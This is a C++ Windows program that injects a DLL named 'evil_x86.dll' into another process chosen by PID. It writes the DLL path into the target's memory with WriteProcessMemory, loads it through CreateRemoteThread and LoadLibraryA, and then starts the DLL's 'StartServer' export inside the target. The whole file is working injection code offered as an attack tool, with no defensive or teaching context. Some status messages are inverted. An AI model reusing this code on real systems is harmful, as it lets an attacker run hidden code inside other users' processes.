#include <windows.h>
#include "program_result.h"

using namespace error_handling;

char evilDLL[] = "C:\\evil_x86.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE target_process; // process handle
  HANDLE remote_thread; // remote thread
  LPVOID remote_buffer; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandleA("Kernel32");
  if (hKernel32 == NULL) {
    printf("Could not initialize Kernel32\n");
    return -1;
  }
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");
  if (lb == NULL) {
    printf("Could not initialize LoadLibraryA\n");
    return -1;
  }

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  printf("PID: %i\n", atoi(argv[1]));
  target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  if (target_process == NULL) {
    printf(" [x] Error while opening the process\n");
  } else printf("[i] Process opened with full access\n");

  // allocate memory buffer for remote process
  remote_buffer = VirtualAllocEx(target_process, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  if (remote_buffer == NULL) {
    printf(" [x] Error while allocating space in the process\n");
  } else printf(" [i] Successfully allocated memory in the target process\n");

  // "copy" evil DLL between processes
  BOOL res = WriteProcessMemory(target_process, remote_buffer, evilDLL, evilLen, NULL);
  if (res == NULL) {
    printf(" [x] Error while writing memory to the target process\n");
  } else printf(" [i] DLL path copied to the target process\n");

  // our process start new thread
  remote_thread = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE)lb, remote_buffer, 0, NULL);
  if (remote_thread == NULL) {
    printf(" [x] Error creating thread in target process. Windows error: %s\n", error_handling::GetLastErrorAsString().c_str());
  } else printf(" [i] Created thread in target process\n");
  
  HMODULE evil_dll = LoadLibraryA(evilDLL);
  if (evil_dll != NULL) {
    printf(" [i] Loaded DLL in current process\n");
    FARPROC start_server_func = GetProcAddress(evil_dll, "StartServer");
    HANDLE res = CreateRemoteThread(target_process, NULL, 0, (LPTHREAD_START_ROUTINE) start_server_func, NULL, 0, NULL);
    if (res == NULL) printf(" [x] Successfully started thread with server on tje target process");
    else printf(" [x] Error starting new thread on the target process\n");
  } else printf("[x] Error loading custom DLL");
  
  CloseHandle(target_process);
  return 0;
}